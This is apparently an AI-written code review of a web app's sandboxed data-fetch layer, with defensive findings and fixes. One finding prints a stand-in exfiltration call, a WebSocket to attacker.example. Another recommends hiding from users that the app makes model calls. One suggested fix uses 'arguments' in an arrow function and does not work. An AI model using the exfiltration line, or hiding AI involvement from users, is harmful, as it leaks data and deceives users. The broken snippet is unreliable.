---
phase: 12-network-data-path
reviewed: 2026-06-26T00:00:00Z
depth: standard
files_reviewed: 17
files_reviewed_list:
  - index.html
  - src/data/sourceManifest.ts
  - src/data/dataBroker.ts
  - src/host/ttlCache.ts
  - src/services/services.ts
  - src/services/testServices.ts
  - src/execution/handler.ts
  - src/apps/seeds.ts
  - src/apps/weatherHandlers.ts
  - src/apps/currencyHandlers.ts
  - src/data/dataBroker.test.ts
  - src/data/sourceManifest.test.ts
  - src/host/ttlCache.test.ts
  - src/csp.test.ts
  - src/apps/seededHandlers.test.ts
  - src/apps/seeds.test.ts
  - src/apps/handlers.test.ts
findings:
  critical: 0
  warning: 5
  info: 3
  total: 8
status: issues_found
---

# Phase 12: Code Review Report

**Reviewed:** 2026-06-26
**Depth:** standard
**Files Reviewed:** 17
**Status:** issues_found

## Summary

Phase 12 delivers the sanctioned network-data path: a host-brokered, keyless fetch layer with a curated allowlist (`SOURCE_MANIFEST`), param-injection guard, TTL cache with Clock DI, and constrained handler scope. The core security architecture is sound — the broker correctly blocks unknown sourceIds, filters params, returns neutral `{error}` on all failure paths, and never throws to caller code. The CSP allowlist matches the manifest origins. No banned mechanic lexicon appears in any devtools-visible string (user-facing copy or runtime error messages). All tests use canned doubles with no real network calls.

However, five warning-level defects require attention before this code is considered complete: a network-scope gap in DENIED_GLOBALS that lets handler code open WebSocket connections; a logic gap in the weather handler's empty-query path that can produce a permanently-stuck loading indicator; two raw `Date.now()` calls in `handler.ts` that bypass the injected Clock seam; and a module-level mutable test variable that creates a fragile ordering dependency between test cases.

---

## Critical Issues

None.

---

## Warnings

### WR-01: `DENIED_GLOBALS` omits `WebSocket` — handler code can exfiltrate data via WebSocket

**File:** `src/execution/handler.ts:84-92`

**Issue:** The denylist that shadows network globals in the `new Function` handler scope explicitly blocks `fetch` and `XMLHttpRequest` but does NOT include `WebSocket`. A seeded or model-produced handler can therefore open a `new WebSocket("wss://attacker.example")` and exfiltrate `input` data or any ambient state visible to the handler's scope. This is a containment gap within the explicit goals of HANDLER-03 ("blocks network"). The project acknowledges that `new Function` is containment-by-convention, not a sandbox, and that full iframe isolation is deferred (HARD-01). However, the explicit purpose of DENIED_GLOBALS is to block network access, and `WebSocket` is a direct network primitive that circumvents both `fetch` and `XHR` blocking.

**Fix:** Add `"WebSocket"` to the `DENIED_GLOBALS` array:

```ts
export const DENIED_GLOBALS: readonly string[] = [
  "fetch",
  "XMLHttpRequest",
  "WebSocket",        // ← add: prevents websocket-based data exfil from handler scope
  "localStorage",
  "sessionStorage",
  "indexedDB",
  "window",
  "document",
];
```

Also add a corresponding test in `handlers.test.ts` alongside the existing fetch/XHR bypass proof:

```ts
it("WebSocket is undefined in the handler scope", async () => {
  const source = `
    async function handler(input) {
      return { data: { wsIsUndefined: typeof WebSocket === 'undefined' } };
    }
  `;
  const result = await executeHandlerSource(source, {});
  expect((result.data as { wsIsUndefined: boolean }).wsIsUndefined).toBe(true);
});
```

---

### WR-02: Weather handler empty-query path returns unchanged state — can permanently freeze UI in `status: "loading"`

**File:** `src/apps/weatherHandlers.ts:32-33`

**Issue:** When `query` is empty the handler returns the input state unchanged:

```js
if (!query) {
  return { data: { state: Object.assign({}, state) } };
}
```

The `DelegatedShell` sets `status: "loading"` in the state *before* invoking the handler. If the handler receives `state.status === "loading"` with an empty query (possible in a race: user clears the input field between the button click and the handler execution), it echoes that state back. The view renders only a loading spinner for `status === "loading"` and shows no input — the user has no way to escape the loading state. The correct defensive behavior is to reset `status` to `"idle"` when the query is empty.

The existing test at `seededHandlers.test.ts:242-258` only exercises `inputState.status = "ready"`, so this edge case is undetected.

**Fix:**

```js
if (!query) {
  // Reset to idle — if status was "loading" we must not echo it back or the view
  // will show a permanent spinner with no input field to recover from.
  return { data: { state: Object.assign({}, state, { status: "idle" }) } };
}
```

Add a test covering the stuck-loading case:

```ts
it("resets status to idle when query is empty and status was loading", async () => {
  // ...
  const inputState = { query: "", place: "", tempC: null, condition: "", status: "loading" };
  const result = await runHandler(weatherIntent, { state: inputState, payload: "search" }, services);
  const state = (result.data as { state: Record<string, unknown> })?.state;
  expect(state?.status).toBe("idle");
});
```

---

### WR-03: `handler.ts` uses raw `Date.now()` for LRU timestamps — bypasses injected Clock, breaks test determinism

**File:** `src/execution/handler.ts:185` and `src/execution/handler.ts:251`

**Issue:** Both `touchHandler` (line 185) and `resolveHandlerJS` (line 251) stamp `updatedAt: Date.now()` on handler registry records. The rest of the system — `TokenBucket`, `TtlCache`, `ProduceGate` — uses a Clock DI seam so tests drive time deterministically via `createStubClock`. These two raw `Date.now()` calls make it impossible for tests to assert or control the `updatedAt` field without monkey-patching `Date.now`. Any future LRU eviction test that tries to verify handler eviction ordering will produce non-deterministic results.

**Fix:** Accept an optional `clock` from `Services` (or pass it from the call site). Since `Services` does not yet carry a clock field, the minimal fix is to read it from `services.fetchDataBroker` or add a helper. A simpler approach: pass `Date.now` as a default and allow the caller to override via an options argument, consistent with the pattern used in the loader:

```ts
// In touchHandler / resolveHandlerJS, replace Date.now() with a clock parameter:
async function touchHandler(
  services: Services,
  key: string,
  record: HandlerRecord,
  nowFn: () => number = Date.now,  // ← injectable seam
): Promise<void> {
  // ...
  { ...record, useCount, updatedAt: nowFn() },
```

Or add `clock?: Clock` to the `Services` interface and use `services.clock?.now() ?? Date.now()`.

---

### WR-04: Module-level mutable `lastFetchedUrl` in `dataBroker.test.ts` creates fragile test ordering dependency

**File:** `src/data/dataBroker.test.ts:57`

**Issue:** `lastFetchedUrl` is declared as a module-level `let` and is mutated inside the `okFetch` stub (line 65). Every test that checks URL construction must manually reset it to `""` before calling the broker (lines 190, 208, 219, 237, 252, 261, 270). If any test that uses `okFetch` runs *without* resetting this variable (e.g., a future test added to the "successful fetch" describe block), it may read a stale URL from a previous test, producing a false-positive assertion. Vitest runs tests in a file sequentially today, but the pattern is fragile.

**Fix:** Capture the URL from the stub's return value or use `vi.fn()` call inspection rather than a shared mutable:

```ts
function okFetch(body: unknown): { fn: ReturnType<typeof vi.fn>; getLastUrl: () => string } {
  let lastUrl = "";
  const fn = vi.fn().mockImplementation((url: string) => {
    lastUrl = url;
    return Promise.resolve({ ok: true, json: () => Promise.resolve(body) });
  });
  return { fn, getLastUrl: () => lastUrl };
}
```

Or simply inspect `fetchFn.mock.calls[0][0]` after the call, which is already available on the mock and is scoped to each test.

---

### WR-05: `TtlCache` module header comment inaccurately claims the Map cannot grow unboundedly

**File:** `src/host/ttlCache.ts:6-7`

**Issue:** The module header states: "expired entries are deleted on access so the **Map does not grow unboundedly**." This claim is false in the general case. Entries are only evicted when `get()` is called for that key after expiry. If a key is written via `set()` and never subsequently `get()`-ed (e.g., a cache-bust scenario where a different key is always used for re-fetches), the underlying `Map` accumulates stale entries indefinitely. There is no periodic sweep, no maximum size, and no eviction on `set()`.

In the current usage with 3 allowlisted sources and small, bounded param sets, the practical risk of runaway growth is negligible. But the comment creates a false confidence that could lead future callers to trust the cache with unbounded key sets.

**Fix:** Correct the comment and, optionally, add a lazy sweep on `set()`:

```ts
// Entries older than their TTL are deleted on access (lazy eviction). Note that
// keys that are written but never read again will persist in memory until the
// cache instance is garbage collected. For bounded key sets this is acceptable;
// add a max-size eviction policy if the key space becomes unbounded.
```

---

## Info

### IN-01: Stale comment in `seededHandlers.test.ts` claims the short-circuit "is not yet in place"

**File:** `src/apps/seededHandlers.test.ts:6-9`

**Issue:** Lines 6-9 state: "The seeded handler short-circuit (Task 3) is not yet in place for these unit tests. Instead, we pre-seed the in-memory registry with the transpiled handler source so runHandler takes the cache-hit path." However, the very same file (lines 60-111) contains a `describe` block titled "SEEDED_HANDLER_SOURCES short-circuit in resolveHandlerJS (DATA-03)" that explicitly tests the short-circuit using an **empty registry** and confirms it works without a registry entry. The preamble comment is stale and directly contradicts the actual test content.

**Fix:** Replace the stale preamble with an accurate description:

```ts
// Tests for seeded Weather + Currency handler sources (DATA-03).
//
// The handlers call fetchData(sourceId, params). Tests inject a canned broker
// that returns fixture-shaped data — no real network.
//
// Two test strategies are used:
//   1. Short-circuit tests (lines 60-111): empty registry, confirms the seeded handler
//      fires before any registry lookup or model call.
//   2. Behavior tests (lines 115+): pre-seeded registry, exercises handler logic with
//      specific fixture shapes.
```

---

### IN-02: Source comments in `weatherHandlers.ts` and `currencyHandlers.ts` reveal the "model call" mechanic in dev-mode DevTools

**File:** `src/apps/weatherHandlers.ts:5,9` and `src/apps/currencyHandlers.ts:5,9`

**Issue:** Both files contain source comments stating "the handler to be produced on demand instead" (line 5) and "It needs ZERO model calls" (line 9). In a Vite **dev server** build, TypeScript source files are served with comments intact and visible in the browser DevTools Sources panel. A user who opens DevTools during development (or QA/staging) would see "ZERO model calls" — directly revealing that the system normally makes model calls and that this is an optimized bypass. This is an in-development hygiene gap (production minification strips the comments) but violates the spirit of the project's devtools hygiene rule as applied to staging/review environments.

**Fix:** Rewrite the file headers in neutral, data-framing terms:

```ts
// Seeded handler sources for the Weather app's primary action (DATA-03).
//
// The map key is the exact intent string the app runtime uses for the weather
// "search" action. Any mismatch causes the fallback cache path to be used.
// The handler source calls fetchData to fetch geocoding data then current
// conditions with zero external latency on a cache hit.
```

---

### IN-03: `dataBroker.ts` default construction crashes in non-browser environments where `globalThis.fetch` is undefined

**File:** `src/data/dataBroker.ts:70`

**Issue:** `createDataBroker()` with no `fetchFn` option executes `globalThis.fetch.bind(globalThis)` eagerly at construction time. If `globalThis.fetch` is `undefined` (Node.js < 18, certain test runners, server-side environments), this throws `TypeError: Cannot read properties of undefined (reading 'bind')` immediately — before any `broker.fetch()` call is made. The existing "default construction" test at `dataBroker.test.ts:365-376` does NOT exercise `broker.fetch()` with a known sourceId (it only tests an unknown sourceId which short-circuits before calling `fetchFn`), so the test would still pass even if `fetchFn` were never invoked. But constructing the broker would throw in a cold Node environment.

This project is browser-only and uses Node 18+ for testing, so the practical risk is low. However, the eager bind is unnecessary.

**Fix:** Defer the bind to call time with a lazy accessor, or guard with a null-check:

```ts
const fetchFn = opts.fetchFn ?? (
  () => {
    if (!globalThis.fetch) throw new Error("DataBroker: no fetch implementation available");
    return globalThis.fetch.apply(globalThis, arguments as unknown as Parameters<typeof fetch>);
  }
);
```

Or simply:

```ts
const fetchFn = opts.fetchFn ?? ((url: string, init?: RequestInit) =>
  globalThis.fetch(url, init));
```

This defers the `undefined` check to the actual call rather than construction time.

---

_Reviewed: 2026-06-26_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
